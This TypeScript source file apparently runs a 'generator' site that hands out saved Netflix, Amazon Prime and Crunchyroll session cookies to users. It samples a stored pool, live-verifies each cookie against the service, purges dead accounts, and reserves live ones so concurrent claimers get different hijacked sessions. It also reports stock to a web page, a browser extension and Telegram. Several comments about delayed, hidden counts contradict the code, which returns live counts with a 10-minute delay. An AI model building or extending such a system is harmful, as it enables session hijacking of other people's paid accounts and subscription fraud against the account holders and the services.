import {
  loadSavedCookiesByIds,
  removeSavedCookies,
  sampleSavedCookieCandidates,
  summarizeSavedCookies,
  type PoolSummaryRow,
  type SavedCookie,
  type SavedCookieMeta,
} from "@/lib/saved-cookies"
import {
  loadSavedPrimeCookiesByIds,
  removeSavedPrimeCookies,
  sampleSavedPrimeCookieCandidates,
  summarizeSavedPrimeCookies,
} from "@/lib/saved-prime-cookies"
import {
  loadSavedCrunchyrollCookiesByIds,
  removeSavedCrunchyrollCookies,
  sampleSavedCrunchyrollCookieCandidates,
  summarizeSavedCrunchyrollCookies,
} from "@/lib/saved-crunchyroll-cookies"
import { checkCrunchyrollCookieNative } from "@/lib/crunchyroll-native"
import { isAliveResult, normalizePlan, prepareCookieForCheck } from "@/lib/cookie-utils"
import { checkNetflixWithLinks, checkPrimeSessionAliveDirect, type GeneratorService as Service } from "@/lib/check-via-proxies"
import type { CheckResult } from "@/lib/normalize-upstream"
import { getCachedConfig } from "@/lib/config-cache"
import { redis, redisEnabled } from "@/lib/redis"

// The native checkers send their input VERBATIM as the HTTP `Cookie:` header — they
// do NOT parse it. Saved pool rows, however, are stored by cookieForStorage in the
// account's ORIGINAL pasted format (RAW / JSON / Netscape) so they export cleanly
// to a browser. Feeding a JSON or Netscape blob as a Cookie header is invalid and
// the request comes back inconclusive — which is exactly why a full pool reported
// "no live accounts". prepareCookieForCheck re-parses ANY stored format down to the
// clean RAW `name=value; …` header the single-cookie checker uses, so claim-time
// verification matches the interactive checker. Falls back to the stored string if
// nothing parses (so we never turn a usable RAW cookie into an empty one).
function toCheckHeader(stored: string, service: Service): string {
  return prepareCookieForCheck(stored, service).cookie || stored
}

// Resolves the pool storage + live verifier for a given service. Both saved-cookie
// libs expose the same SavedCookie shape and both native checkers share the same
// signature/return type, so the distribution engine below stays service-agnostic —
// it just picks the right pool + validator here.
// Each service exposes the SAME lightweight surface, so the engine stays
// service-agnostic:
//   summarize  → tiny per (plan,country) aggregate for availability display
//   sample     → BOUNDED random candidate slice (id/plan/country, no cookie blobs)
//                biased toward the requested plan+country. Read per claim; its size
//                is CONSTANT regardless of pool size, so heavy claiming can't scale
//                egress with the number of saved accounts.
//   loadByIds  → full rows (with cookie) for a small set of ids, fetched on demand
//   remove     → bulk delete by id
//   check      → live single-cookie verifier
// This split is what keeps data transfer bounded: page views read only `summarize`
// and a claim reads `sample` + `loadByIds` for at most a couple dozen candidates —
// never the entire table of multi-KB cookie blobs.
function poolApi(service: Service) {
  if (service === "prime") {
    return {
      summarize: summarizeSavedPrimeCookies,
      sample: sampleSavedPrimeCookieCandidates,
      loadByIds: loadSavedPrimeCookiesByIds,
      remove: removeSavedPrimeCookies,
      // DIRECT, NO PROXY, LOGIN-ONLY hand-out check (checkPrimeSessionAliveDirect).
      // The pool is already active-Prime-confirmed at INGESTION (bulk checker), so a
      // claim only re-confirms the session is still LOGGED IN — which is reliable
      // direct from any IP via Amazon's config API (customerID), so NO proxy is needed
      // and the claim stays fast. Crucially it does NOT re-demand the storefront's
      // fragile Prime-membership flag: from our US datacenter IP that flag is often
      // absent (paid === null), and the old checks (direct-only OR proxy-confirmed)
      // therefore skipped/deleted or timed out on every good foreign account until the
      // pool read empty ("No streamable account available") despite thousands saved.
      // Authoritative logged-out / on-hold / no-Prime still return DEAD so stale rows
      // are purged.
      check: (cookie: string) => checkPrimeSessionAliveDirect(toCheckHeader(cookie, "prime"), { includeRaw: false }),
    }
  }
  if (service === "crunchyroll") {
    return {
      summarize: summarizeSavedCrunchyrollCookies,
      sample: sampleSavedCrunchyrollCookieCandidates,
      loadByIds: loadSavedCrunchyrollCookiesByIds,
      remove: removeSavedCrunchyrollCookies,
      check: (cookie: string) =>
        checkCrunchyrollCookieNative(toCheckHeader(cookie, "crunchyroll"), { includeRaw: false }),
    }
  }
  return {
    summarize: summarizeSavedCookies,
    sample: sampleSavedCookieCandidates,
    loadByIds: loadSavedCookiesByIds,
    remove: removeSavedCookies,
    // Distribution liveness verification runs the SAME direct (no-proxy) path as the
    // single checker (checkNetflixWithLinks). Verdict only — the fresh nftoken link
    // is minted when the winning account is handed to the user (see toGrantedAccount),
    // so we don't pay a token mint for every candidate we merely probe for liveness.
    check: (cookie: string) => checkNetflixWithLinks(toCheckHeader(cookie, "netflix"), { includeRaw: false }),
  }
}

// THE DISTRIBUTION ENGINE.
// Picks a single alive saved account matching the user's chosen plan/country,
// never one they've already received, and LIVE-verifies it with a direct (no-proxy)
// Netflix request before handing it over. Any candidate that comes back CONFIRMED DEAD is deleted
// from the database immediately, and the search falls through to the next
// candidate — first within the chosen plan/country, then across the whole pool —
// until a live account is found. Everything runs server-side; the full pool is
// never exposed to the client.
//
// FALSE-POSITIVE SAFETY: a candidate is only ever deleted when verification is
// AUTHORITATIVE (Netflix says the session is logged-out / the plan is expired).
// Transient failures (proxy block, timeout, rate-limit, bot challenge) carry an
// errorCategory and are treated as "unknown" — they are skipped for this request
// but NEVER deleted, so a flaky proxy can't wipe a still-valid account.

// Hard cap on how many candidates we live-verify, so a return never hangs even if
// many stored cookies have since died. Checks run concurrently in small batches,
// so this stays responsive while giving plenty of runway to skip past a cluster of
// dead accounts (which are also being deleted as we go) to a live one.
const MAX_VERIFY_ATTEMPTS = 24

// How many candidates to verify in parallel per wave. Keeps latency low when the
// first several candidates are dead without firing the whole pool at once.
const VERIFY_CONCURRENCY = 4

function shuffle<T>(arr: T[]): T[] {
  const a = [...arr]
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[a[i], a[j]] = [a[j], a[i]]
  }
  return a
}

// ── CROSS-USER ANTI-CROWDING ────────────────────────────────────────────────
// Per-request shuffle already randomizes WHICH account a single user gets. But two
// different users/IPs claiming in the same window each shuffle independently and can
// both land on the same account — crowding it. To spread hand-outs across the whole
// pool, we remember (in Redis, shared across all serverless instances) the account
// ids handed out in the last RECENT_SPREAD_WINDOW_MS and DEPRIORITIZE them (sort to
// the back), so a just-given account is only reused once fresher ones are exhausted.
// It is never EXCLUDED, so a tiny pool still works. Fails OPEN (no spreading) when
// Redis is unavailable, so distribution never breaks.
const RECENT_SPREAD_WINDOW_MS = 30 * 60 * 1000 // 30 minutes
const recentGrantKey = (service: Service) => `reward:recent-grant:${service}`

// Ids handed out within the spread window (per service). Empty on any Redis issue.
async function getRecentlyDistributed(service: Service): Promise<Set<string>> {
  if (!redisEnabled) return new Set()
  try {
    const cutoff = Date.now() - RECENT_SPREAD_WINDOW_MS
    const ids = await redis.zrange<string[]>(recentGrantKey(service), cutoff, "+inf", { byScore: true })
    return new Set(ids)
  } catch (err) {
    console.log("[v0] reward-distribution: recent-grant read failed (non-fatal):", err)
    return new Set()
  }
}

// Records an account as just handed out and trims stale entries. Best-effort.
async function markRecentlyDistributed(service: Service, id: string): Promise<void> {
  if (!redisEnabled) return
  try {
    const now = Date.now()
    await redis.zadd(recentGrantKey(service), { score: now, member: id })
    await redis.zremrangebyscore(recentGrantKey(service), 0, now - RECENT_SPREAD_WINDOW_MS)
    // Safety TTL so the key can't grow unbounded if a trim is ever missed.
    await redis.expire(recentGrantKey(service), Math.ceil((RECENT_SPREAD_WINDOW_MS / 1000) * 2))
  } catch (err) {
    console.log("[v0] reward-distribution: recent-grant write failed (non-fatal):", err)
  }
}

// ── ATOMIC PICK-TIME RESERVATION ────────────────────────────────────────────
// The recent-grant list above only REORDERS the pool (fresh-first), which spreads
// hand-outs over time but can't stop a SIMULTANEOUS collision: when several users
// claim in the same instant they all read the same recent set (nobody's been
// recorded yet), independently shuffle the same pool, and RNG can still land them
// on the SAME account. To make selection truly non-overlapping we place a short,
// atomic lock (`SET key NX`) on an account the moment it's picked. The first claim
// to set the key wins; a concurrent claim's SET fails and it moves on to the next
// alive candidate — so two people claiming at once get DIFFERENT accounts.
//
// The lock is a PREFERENCE, not a hard block: if EVERY alive account is currently
// reserved (tiny pool / heavy contention), we fall back to handing out a reserved-
// but-verified-alive one rather than failing the user — exactly the "unless there's
// no other choice" rule. TTL is short (just long enough to cover a claim); the
// 30-min recent-grant list handles longer-term spreading. Fails OPEN (reservation
// "succeeds") when Redis is down, so distribution behaves exactly as before.
const RESERVE_TTL_MS = 90 * 1000
const reserveKey = (service: Service, id: string) => `reward:reserve:${service}:${id}`

async function tryReserve(service: Service, id: string): Promise<boolean> {
  if (!redisEnabled) return true // fail open — no Redis means no cross-instance locking
  try {
    const res = await redis.set(reserveKey(service, id), "1", { nx: true, px: RESERVE_TTL_MS })
    return res === "OK"
  } catch (err) {
    console.log("[v0] reward-distribution: reserve failed (non-fatal, fail-open):", err)
    return true
  }
}

// Randomizes a list, then orders NOT-recently-handed-out accounts BEFORE recently
// handed-out ones. Each sub-group is independently shuffled, so selection stays
// fully random within a group while consistently preferring fresh accounts — this
// is what stops any single account being crowded across users. Because it feeds
// findAlive (which walks in list order and skips dead→next), a dead pick still
// falls through to another RANDOM fresh account, never "the first row in the table".
function spreadFreshFirst(list: SavedCookieMeta[], recentIds: Set<string>): SavedCookieMeta[] {
  if (recentIds.size === 0) return shuffle(list)
  const fresh: SavedCookieMeta[] = []
  const recent: SavedCookieMeta[] = []
  for (const c of list) (recentIds.has(c.id) ? recent : fresh).push(c)
  return [...shuffle(fresh), ...shuffle(recent)]
}

// Splits the pool into "preferred" (matches plan AND country) and "fallback"
// (everything else), each excluding accounts the user already received. Plan is
// matched via normalizePlan so "Premium (extra member)" still matches "Premium".
function partitionPool(
  pool: SavedCookieMeta[],
  plan: string | null,
  country: string | null,
  receivedIds: Set<string>,
  recentIds: Set<string>,
): { preferred: SavedCookieMeta[]; fallback: SavedCookieMeta[] } {
  const available = pool.filter((c) => !receivedIds.has(c.id))
  const wantPlan = plan ? normalizePlan(plan) : null
  const preferred: SavedCookieMeta[] = []
  const fallback: SavedCookieMeta[] = []
  for (const c of available) {
    const planOk = !wantPlan || normalizePlan(c.plan) === wantPlan
    const countryOk = !country || c.countryCode === country
    if (planOk && countryOk) preferred.push(c)
    else fallback.push(c)
  }
  // Each tier is randomized AND fresh-first (deprioritizing recently handed-out
  // accounts) so selection is fully random yet never crowds one account.
  return {
    preferred: spreadFreshFirst(preferred, recentIds),
    fallback: spreadFreshFirst(fallback, recentIds),
  }
}

// The verdict for a single live verification. "dead" is reserved for AUTHORITATIVE
// negatives only (Netflix logged-out / plan expired) — those are safe to delete.
// "unknown" covers every transient/inconclusive case and is NEVER deleted.
type Verdict = "alive" | "dead" | "unknown"

// Plan labels that explicitly mean "no paid subscription". A live result carrying
// one of these is NEVER handed out, even if it somehow came back valid.
const NON_SUBSCRIPTION_PLAN_RE = /no prime|no subscription|free\b/i

// Is this LIVE result a hand-out-worthy account for the service? This is the exact
// rule the user asked for — only give out accounts that are verified, logged in,
// NOT expired, and (for Prime/Crunchyroll) carry a POSITIVELY-confirmed active
// subscription. It's a hand-out-layer guarantee that does not depend on checker
// internals: even a legacy/edge result that slips through as `valid` is rejected
// unless it names a real subscription plan.
function isDistributableHit(result: CheckResult, service: Service): boolean {
  // valid === true AND the plan is not an expired marker.
  if (!isAliveResult(result)) return false
  // Payment-hold / paused membership guard — applies to EVERY service. Such a session
  // still logs in, but the subscription CANNOT stream (Netflix "account on hold",
  // Amazon Prime "membership on hold / paused"), so it must never be handed to a user.
  // The checkers tag these with membershipOnHold; rejecting here is a hand-out-layer
  // guarantee independent of per-service checker internals.
  if (result.membershipOnHold) return false
  // Netflix behavior is intentionally UNCHANGED — any other alive Netflix plan qualifies.
  if (service === "netflix") return true
  // Prime & Crunchyroll: require a real, positively-identified subscription plan and
  // reject the explicit "no subscription" / free labels.
  const plan = (result.plan ?? "").trim()
  if (!plan) return false
  if (NON_SUBSCRIPTION_PLAN_RE.test(plan)) return false
  return true
}

// Maps a live CheckResult to a distribution Verdict. A negative result is only
// AUTHORITATIVE (→ "dead", safe to delete) when it carries NO errorCategory. Any
// errorCategory (timeout, upstream error, bot challenge, unconfirmed-across-proxies)
// means the check was inconclusive → "unknown": skip it for this request, never
// delete. A result that is valid but has NO confirmable subscription (Prime/
// Crunchyroll) is NOT handed out and NOT deleted → "unknown" (skip this request).
function verdictOf(result: CheckResult, service: Service): Verdict {
  if (isDistributableHit(result, service)) return "alive"
  if (result.errorCategory) return "unknown"
  // Authoritative negatives (logged-out / expired / confirmed no-subscription with
  // no transient error) are safe to purge from the pool.
  if (!result.valid) return "dead"
  // valid but not distributable (e.g. Prime session with no confirmable membership)
  // — ambiguous, so skip WITHOUT deleting to avoid purging a possibly-good row.
  return "unknown"
}

// Walks a candidate list in small concurrent waves, returning the FIRST live
// account in list order (bounded by the shared attempt budget). Every candidate
// confirmed dead along the way is pushed into `deadIds` for deletion. Returns the
// full saved row so the caller can show every detail; null if none verified.
// Returns the first alive account that could be ATOMICALLY RESERVED (so concurrent
// claims never take the same one). `contended` holds the first alive account that
// verified fine but was already reserved by another in-flight claim — the caller
// uses it as a last resort when no unreserved account exists anywhere.
async function findAlive(
  candidates: SavedCookieMeta[],
  loadByIds: (ids: string[]) => Promise<SavedCookie[]>,
  verify: (cookie: string) => Promise<Verdict>,
  budgetRef: { remaining: number },
  deadIds: Set<string>,
  reserve: (id: string) => Promise<boolean>,
): Promise<{ picked: SavedCookie | null; contended: SavedCookie | null }> {
  let contended: SavedCookie | null = null
  let i = 0
  while (i < candidates.length && budgetRef.remaining > 0) {
    const waveMeta = candidates.slice(i, i + Math.min(VERIFY_CONCURRENCY, budgetRef.remaining))
    i += waveMeta.length
    budgetRef.remaining -= waveMeta.length
    // Fetch the actual cookie blobs for JUST this wave — the only place full rows are
    // ever loaded. Re-order the loaded rows back into wave (list) order and drop any
    // that vanished or lack a cookie, so "first alive in list order" still holds.
    const loaded = await loadByIds(waveMeta.map((c) => c.id))
    const byId = new Map(loaded.map((r) => [r.id, r]))
    const wave = waveMeta
      .map((m) => byId.get(m.id))
      .filter((r): r is SavedCookie => !!r && !!r.cookie)
    if (wave.length === 0) continue
    const verdicts = await Promise.all(wave.map((c) => verify(c.cookie)))
    // Collect alive candidates in list order; record dead ones for purge.
    const aliveInWave: SavedCookie[] = []
    wave.forEach((c, idx) => {
      const v = verdicts[idx]
      if (v === "dead") deadIds.add(c.id)
      else if (v === "alive") aliveInWave.push(c)
      // "unknown" verdicts → skipped for this request, rows left untouched.
    })
    // Hand back the first alive account we can atomically claim. If reservation
    // fails, another concurrent claim already took it — remember the first such
    // account and keep looking so this user gets a DIFFERENT one.
    for (const c of aliveInWave) {
      if (await reserve(c.id)) return { picked: c, contended }
      if (!contended) contended = c
    }
  }
  return { picked: null, contended }
}

// Main entry: returns a freshly-verified alive account (full saved row) for the
// user, or null if none can be found (pool empty / all dead). Any
// accounts confirmed dead during the search are purged from the database before
// returning, regardless of whether a live one was ultimately found.
export async function distributeAccount(opts: {
  plan: string | null
  country: string | null
  receivedIds: string[]
  service?: Service
}): Promise<SavedCookie | null> {
  const service = opts.service ?? "netflix"
  const api = poolApi(service)
  // Pull only a BOUNDED random candidate slice (id/plan/country, no cookie blobs),
  // biased toward the requested plan+country and already excluding accounts this user
  // received. This replaces the old whole-pool metadata read, so a claim transfers a
  // constant few KB no matter how large the pool grows. Cookie blobs are still fetched
  // on demand for only the handful of candidates we live-verify.
  const pool = await api.sample({
    plan: opts.plan,
    country: opts.country,
    receivedIds: opts.receivedIds,
  })
  if (pool.length === 0) return null

  const received = new Set(opts.receivedIds)
  // Cross-user spread: accounts handed out to ANYONE in the recent window are sorted
  // to the back so consecutive claims (even from different IPs) don't crowd the same
  // account. Read is best-effort — an empty set just means plain random selection.
  const recentIds = await getRecentlyDistributed(service)
  const { preferred, fallback } = partitionPool(pool, opts.plan, opts.country, received, recentIds)

  // LIVE, DIRECT verification — one candidate at a time, NO proxy. A reward claim
  // checks a single cookie per candidate: exactly the same low-volume pattern as the
  // single-cookie checker, which dials the service DIRECTLY (no proxy) and works
  // fine for Prime and Crunchyroll. One request can't trip the service's rate limits,
  // so there's no need to route through the proxy pool here. Going direct also avoids
  // the cold-start proxy scrape (which could add tens of seconds to the first claim)
  // and proxy-hop latency, and removes the chance of a flaky exit IP producing a
  // false "dead" for a still-valid account. Verdicts are mapped so only an
  // AUTHORITATIVE logged-out/expired result deletes; transient errors are skipped.
  const verify = async (cookie: string): Promise<Verdict> => verdictOf((await api.check(cookie)).result, service)
  const reserve = (id: string): Promise<boolean> => tryReserve(service, id)

  const budgetRef = { remaining: MAX_VERIFY_ATTEMPTS }
  const deadIds = new Set<string>()

  // Try the preferred (plan + country) pool first, then fall back to any other
  // alive account when the chosen combination is exhausted. Each pass prefers an
  // account no other in-flight claim has reserved.
  const preferredRes = await findAlive(preferred, api.loadByIds, verify, budgetRef, deadIds, reserve)
  let found = preferredRes.picked
  let contended = preferredRes.contended
  if (!found) {
    const fallbackRes = await findAlive(fallback, api.loadByIds, verify, budgetRef, deadIds, reserve)
    found = fallbackRes.picked
    contended = contended ?? fallbackRes.contended
  }
  // No UNRESERVED alive account exists anywhere (tiny pool / heavy contention) →
  // there's no other choice, so hand out a verified-alive account that another
  // claim is also using rather than failing this user.
  if (!found) found = contended

  // Purge every confirmed-dead account in one round-trip. Best-effort: a delete
  // failure must never block handing the user their live account.
  if (deadIds.size > 0) {
    try {
      await api.remove(Array.from(deadIds))
    } catch (err) {
      console.log("[v0] reward-distribution: failed to purge dead accounts:", err)
    }
  }

  // Record the handed-out account so the next claims (from this or any other IP)
  // spread onto different accounts instead of crowding this one. Best-effort.
  if (found) await markRecentlyDistributed(service, found.id)

  return found
}

// `count` is an AVAILABILITY FLAG (1 = available, 0 = none), NOT a real stock count —
// see getPoolOptions. Kept as a number so the client's sum/`> 0` logic is unchanged.
export type PoolCombo = { plan: string; country: string; count: number }
export type PoolOptions = {
  plans: string[]
  countries: string[]
  // Per (plan, country) availability FLAG (1/0). Lets the selection UI enable/disable
  // each choice and recompute live as the user filters, without exposing real counts.
  combos: PoolCombo[]
  // Availability FLAG (1/0) for accounts with a cookie but no plan AND/OR country
  // metadata. They back the "Any plan / Any country" path, so they contribute to
  // that availability only. Clamped to 1/0 so no real count reaches the client.
  untagged: number
  // The true size of the distributable pool = every saved account with a cookie.
  // SERVER-SIDE ONLY — never passed to the client component / serialized to the browser.
  total: number
  // ��─ DISPLAY-ONLY, 1-HOUR-DELAYED REAL COUNTS ─────────────────────────────────
  // Real per (plan, country) counts as they were AT LEAST ONE HOUR AGO (newest
  // snapshot older than the delay window). These drive the visible "N available"
  // labels ONLY — never gating — so the live pool size is never exposed in real
  // time. Empty until an hour of snapshots has accrued (e.g. right after deploy),
  // in which case the UI falls back to the plain Available/Unavailable label.
  displayCombos: PoolCombo[]
  // 1-hour-delayed real count of untagged accounts (folds into "Any plan / Any
  // country" display only), matching `untagged`'s role but as a real number.
  displayUntagged: number
}

// Distinct plan/country options actually present in the pool, WITH per-combo
// counts, so the selection UI only offers fulfillable combinations and can show
// dynamic availability numbers.
// Short in-process cache for the availability summary. The generator pages are the
// most-visited public surface, so without this every page view (including bots and
// crawlers) would run the aggregate. A 60s window collapses bursts of page views on
// a warm instance into a single query; availability is not realtime-critical, so a
// brief lag as the pool changes is fine. Combined with the aggregate itself (which
// transfers a few rows, not the whole table), generator traffic no longer moves
// meaningful data out of the database.
const POOL_SUMMARY_TTL_MS = 60_000

// ── 1-HOUR-DELAYED STOCK COUNTS ─────────────────────────────────────────────
// The generator pages now show a REAL account count, but intentionally lagged by
// one hour so the live pool size is never exposed in real time. We keep a rolling
// series of snapshots in Redis (shared across all serverless instances): every
// ~5 min the current real per-combo counts are appended with a timestamp, and the
// page renders the NEWEST snapshot that is at least COUNT_DELAY_MS old. Availability
// GATING never uses these numbers — it still uses the live 1/0 flags — so a stale
// count can never wrongly enable/disable a claim.
type CountSnapshot = { t: number; combos: PoolCombo[]; untagged: number }
const COUNT_DELAY_MS = 10 * 60 * 1000 // show counts as they were 10 minutes ago
const COUNT_SNAPSHOT_INTERVAL_MS = 5 * 60 * 1000 // record at most one snapshot / 5 min
const COUNT_RETENTION_MS = COUNT_DELAY_MS + 30 * 60 * 1000 // keep at least 40 minutes of history
const countSnapshotKey = (service: Service) => `pool:count-snapshots:${service}`
const countSnapshotLockKey = (service: Service) => `pool:count-snapshot-lock:${service}`

// Appends the current real counts as a timestamped snapshot and trims old ones.
// Cross-instance throttled via a short NX lock so only one snapshot lands per
// interval no matter how many instances serve traffic. Best-effort / fails open.
async function recordCountSnapshot(service: Service, combos: PoolCombo[], untagged: number): Promise<void> {
  if (!redisEnabled) return
  try {
    const now = Date.now()
    const lock = await redis.set(countSnapshotLockKey(service), "1", { nx: true, px: COUNT_SNAPSHOT_INTERVAL_MS })
    if (lock !== "OK") return // another instance already snapshotted this interval
    const payload: CountSnapshot = { t: now, combos, untagged }
    await redis.zadd(countSnapshotKey(service), { score: now, member: JSON.stringify(payload) })
    await redis.zremrangebyscore(countSnapshotKey(service), 0, now - COUNT_RETENTION_MS)
    await redis.expire(countSnapshotKey(service), Math.ceil((COUNT_RETENTION_MS / 1000) * 2))
  } catch (err) {
    console.log("[v0] reward-distribution: count snapshot write failed (non-fatal):", err)
  }
}

// Returns the newest snapshot whose timestamp is at least COUNT_DELAY_MS old, or
// null if none has accrued yet. Upstash may auto-deserialize the stored member back
// into an object, so we handle both string and object forms.
async function readDelayedCountSnapshot(service: Service): Promise<CountSnapshot | null> {
  if (!redisEnabled) return null
  try {
    const cutoff = Date.now() - COUNT_DELAY_MS
    // Ascending by score up to the cutoff; the last element is the newest ≤ cutoff.
    const rows = (await redis.zrange(countSnapshotKey(service), "-inf", cutoff, {
      byScore: true,
    })) as (string | CountSnapshot)[]
    if (!rows || rows.length === 0) return null
    const raw = rows[rows.length - 1]
    const snap = typeof raw === "string" ? (JSON.parse(raw) as CountSnapshot) : raw
    return snap && Array.isArray(snap.combos) ? snap : null
  } catch (err) {
    console.log("[v0] reward-distribution: count snapshot read failed (non-fatal):", err)
    return null
  }
}

export type TelegramPoolSummary = {
  total: number
  plans: Array<{ name: string; count: number }>
  countries: Array<{ plan: string; code: string; count: number }>
}

export async function getTelegramPoolSummary(service: Service = "netflix"): Promise<TelegramPoolSummary> {
  const summary = await getCachedConfig<PoolSummaryRow[]>(`pool-summary:${service}`, POOL_SUMMARY_TTL_MS, () => poolApi(service).summarize())
  const planCounts = new Map<string, number>()
  const countryCounts = new Map<string, number>()
  let total = 0
  for (const row of summary) {
    const count = Math.max(0, Number(row.count) || 0)
    total += count
    const plan = normalizePlan(row.plan)
    const country = String(row.country || "").trim().toUpperCase()
    if (plan) planCounts.set(plan, (planCounts.get(plan) || 0) + count)
    if (plan && country) countryCounts.set(`${plan}|||${country}`, (countryCounts.get(`${plan}|||${country}`) || 0) + count)
  }
  const byCount = (a: { count: number }, b: { count: number }) => b.count - a.count
  return {
    total,
    plans: [...planCounts.entries()].map(([name, count]) => ({ name, count })).sort((a, b) => byCount(a, b) || a.name.localeCompare(b.name)),
    countries: [...countryCounts.entries()].map(([key, count]) => {
      const [plan, code] = key.split("|||")
      return { code, count, plan }
    }).sort((a, b) => byCount(a, b) || a.code.localeCompare(b.code)),
  }
}

export async function getPoolOptions(service: Service = "netflix"): Promise<PoolOptions> {
  const summary = await getCachedConfig<PoolSummaryRow[]>(`pool-summary:${service}`, POOL_SUMMARY_TTL_MS, () =>
    poolApi(service).summarize(),
  )
  const plans = new Set<string>()
  const countries = new Set<string>()
  const comboMap = new Map<string, number>()
  let tagged = 0
  let usable = 0

  for (const row of summary) {
    // Each row is a pre-aggregated (plan, country) bucket with its COUNT.
    usable += row.count
    const p = normalizePlan(row.plan)
    const country = row.country || ""
    // Buckets missing plan OR country can't back a specific combo, but they remain
    // part of the overall pool (counted via `untagged`/`total`).
    if (!p || !country) continue
    tagged += row.count
    plans.add(p)
    countries.add(country)
    const key = `${p}|||${country}`
    comboMap.set(key, (comboMap.get(key) ?? 0) + row.count)
  }

  // Return the live counts so the website's plan and country totals match the
  // current pool instead of showing boolean availability or delayed snapshots.
  const combos: PoolCombo[] = Array.from(comboMap.entries()).map(([key, count]) => {
    const [plan, country] = key.split("|||")
    return { plan, country, count }
  })

  // REAL per-combo counts (unclamped) — used ONLY to feed the delayed snapshot
  // series, never returned directly to the client.
  const realCombos: PoolCombo[] = Array.from(comboMap.entries()).map(([key, count]) => {
    const [plan, country] = key.split("|||")
    return { plan, country, count }
  })
  const realUntagged = Math.max(0, usable - tagged)

  // Record the current real counts (cross-instance throttled to one write / interval)
  // and read back the snapshot from ≥1h ago for display. Both are best-effort and
  // in-process cached so page views don't hammer Redis. If no delayed snapshot exists
  // yet, displayCombos stays empty and the UI shows plain Available/Unavailable.
  await getCachedConfig(`pool-count-record:${service}`, COUNT_SNAPSHOT_INTERVAL_MS, async () => {
    await recordCountSnapshot(service, realCombos, realUntagged)
    return 1
  })
  const delayed = await getCachedConfig(`pool-count-delayed:${service}`, POOL_SUMMARY_TTL_MS, () =>
    readDelayedCountSnapshot(service),
  )

  return {
    plans: Array.from(plans).sort(),
    countries: Array.from(countries).sort(),
    combos,
    untagged: usable - tagged > 0 ? 1 : 0,
    // `total` is the true pool size for SERVER-SIDE use only. It is never passed to
    // the client component, so it is never serialized to the browser.
    total: usable,
    // The visible website counts must reflect the same live snapshot used for
    // availability and selection.
    displayCombos: realCombos,
    displayUntagged: realUntagged,
  }
}

// ── PLAN-ONLY AVAILABILITY (for the browser extension) ──────────────────��───
// The extension picks by PLAN alone (no country), so it needs the distinct plans
// present in the pool with a simple 1/0 availability flag — never a real count,
// matching the privacy rule used everywhere else. A normalized plan is counted as
// available if ANY saved account carries it, regardless of country (including rows
// with no country tag). An `anyUntagged` flag reports whether there are accounts
// with no plan metadata at all, which back the "Any plan" (random) choice.
export type PlanAvailability = { plan: string; available: boolean }
export async function listPlanAvailability(
  service: Service = "netflix",
): Promise<{ plans: PlanAvailability[]; anyAvailable: boolean }> {
  const summary = await getCachedConfig<PoolSummaryRow[]>(`pool-summary:${service}`, POOL_SUMMARY_TTL_MS, () =>
    poolApi(service).summarize(),
  )
  const planCounts = new Map<string, number>()
  let total = 0
  for (const row of summary) {
    total += row.count
    const p = normalizePlan(row.plan)
    if (!p) continue
    planCounts.set(p, (planCounts.get(p) ?? 0) + row.count)
  }
  const plans: PlanAvailability[] = Array.from(planCounts.entries())
    .map(([plan, count]) => ({ plan, available: count > 0 }))
    .sort((a, b) => a.plan.localeCompare(b.plan))
  return { plans, anyAvailable: total > 0 }
}
